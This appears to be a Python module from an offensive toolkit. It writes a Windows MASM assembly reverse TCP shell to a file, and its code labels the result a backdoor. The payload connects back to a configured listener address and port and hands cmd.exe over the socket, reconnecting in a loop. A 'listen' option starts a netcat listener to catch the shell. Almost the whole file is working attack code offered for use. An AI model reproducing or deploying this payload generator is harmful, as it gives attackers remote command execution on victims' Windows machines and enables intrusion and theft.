import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_asm_reverse_tcp",
        "title"       : "Payload assembly",
        "module"      : "payloads/nc/asm/reverse_tcp assembly windows",
        "description" : "Payload creation and exploitation"
}

var.lname = ["payload.asm"]
var.ltype = ["listen"]

options ={
  "LHOST" : [str(var.lhost[0]),'The listen address'],
  "LPORT" : [str(var.lport[0]),'The listen port'],
  "LNAME" : [str(var.lname[0]),'The name of payload'],
  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
}

def running():
        try:
                if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
                        print ("")
                        print (blue+"[*]"+default+ "Create a backdour")
                        time.sleep(2)
                        print ("")
                        time.sleep(2)
                        print ("")
                        print (green_underline+"[*] Done"+default)
                        time.sleep(2)
                        print ("")
                        mark = '"'
                        f = open(var.lname[0] , 'w')
                        payload = '''
.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\ws2_32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\ws2_32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib

.data
  cmd     db "cmd",06
  UrIP    db '''+mark+var.lhost[0]+'''",0
  port    db '''+mark+var.lport[0]+'''",0
.data?
  sinfo   STARTUPINFO<>
  pi      PROCESS_INFORMATION<>
  sin     sockaddr_in<>
  WSAD    WSADATA<>
  Wsocket dd ?
.code
start:
    invoke WSAStartup, 101h, addr WSAD
    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0
           mov Wsocket, eax
           mov sin.sin_family, 2
    invoke atodw, addr port
    invoke htons, eax
           mov sin.sin_port, ax
    invoke gethostbyname, addr UrIP
          mov eax, [eax+12]
          mov eax, [eax]
          mov eax, [eax]
          mov sin.sin_addr, eax

          mov eax,Wsocket
          mov sinfo.hStdInput,eax
          mov sinfo.hStdOutput,eax
          mov sinfo.hStdError,eax
          mov sinfo.cb,sizeof STARTUPINFO
          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
 shellagain:
    invoke connect, Wsocket, addr sin , sizeof(sockaddr_in)
    invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi
    invoke WaitForSingleObject,pi.hProcess,INFINITE
        jmp shellagain
 ret
end start

'''
                        f.write(payload)
                        f.close()

                elif var.ltype[0] == "listen" or var.ltype[0] == "LISTEN":
                        os.system("nc -l -p "+str(var.lport[0])+" -v")

                else:
                        print (red+"[-]"+default+"Choose LTYPE " )
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
